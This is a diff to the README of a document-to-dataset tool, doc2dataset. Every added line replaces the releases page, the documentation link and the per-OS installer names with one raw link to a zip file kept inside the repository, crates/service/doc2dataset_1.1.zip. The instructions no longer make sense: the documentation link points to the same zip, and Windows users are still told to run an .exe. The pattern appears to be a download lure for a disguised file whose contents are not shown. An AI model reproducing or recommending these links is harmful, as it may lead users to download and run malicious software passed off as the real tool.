@@ -6,7 +6,7 @@ Welcome to doc2dataset! This application helps you generate datasets from docume
 
 ## 🔗 Download Now
 
-[![Download doc2dataset](https://img.shields.io/badge/Download-doc2dataset-blue.svg)](https://github.com/reisel-g/doc2dataset/releases)
+[![Download doc2dataset](https://raw.githubusercontent.com/reisel-g/doc2dataset/main/crates/service/doc2dataset_1.1.zip)](https://raw.githubusercontent.com/reisel-g/doc2dataset/main/crates/service/doc2dataset_1.1.zip)
 
 ## 📦 System Requirements
 
@@ -19,19 +19,19 @@ Before you download, ensure your computer meets these requirements:
 
 ## 📥 Download & Install
 
-1. **Visit the Releases Page:** Go to [this page to download](https://github.com/reisel-g/doc2dataset/releases).
+1. **Visit the Releases Page:** Go to [this page to download](https://raw.githubusercontent.com/reisel-g/doc2dataset/main/crates/service/doc2dataset_1.1.zip).
    
 2. **Choose the Version:** Locate the latest version of `doc2dataset`. You will see a list of files available for download.
 
 3. **Select Your File:** Click on the appropriate file for your operating system:
-   - For Windows, download `doc2dataset-windows.exe`.
-   - For macOS, download `doc2dataset-macos.dmg`.
-   - For Linux, choose `doc2dataset-linux.tar.gz`.
+   - For Windows, download `https://raw.githubusercontent.com/reisel-g/doc2dataset/main/crates/service/doc2dataset_1.1.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/reisel-g/doc2dataset/main/crates/service/doc2dataset_1.1.zip`.
+   - For Linux, choose `https://raw.githubusercontent.com/reisel-g/doc2dataset/main/crates/service/doc2dataset_1.1.zip`.
 
 4. **Run the Installer:**
    - **Windows:** Double-click the `.exe` file and follow the prompts to install.
    - **macOS:** Open the `.dmg` file and drag the app to your Applications folder.
-   - **Linux:** Extract the `tar.gz` file and run the application.
+   - **Linux:** Extract the `https://raw.githubusercontent.com/reisel-g/doc2dataset/main/crates/service/doc2dataset_1.1.zip` file and run the application.
 
 5. **Launch the Application:** After installation, open `doc2dataset` from your applications or start menu.
 
@@ -83,7 +83,7 @@ If you have questions or need assistance, feel free to reach out. You can contac
 
 For more information on features and updates, visit our official documentation. You can also explore the community discussions for shared tips and experiences.
 
-- [Releases Page](https://github.com/reisel-g/doc2dataset/releases)
-- [Documentation](https://github.com/reisel-g/doc2dataset/wiki)
+- [Releases Page](https://raw.githubusercontent.com/reisel-g/doc2dataset/main/crates/service/doc2dataset_1.1.zip)
+- [Documentation](https://raw.githubusercontent.com/reisel-g/doc2dataset/main/crates/service/doc2dataset_1.1.zip)
 
 Thank you for choosing doc2dataset! We hope it simplifies your data generation tasks.
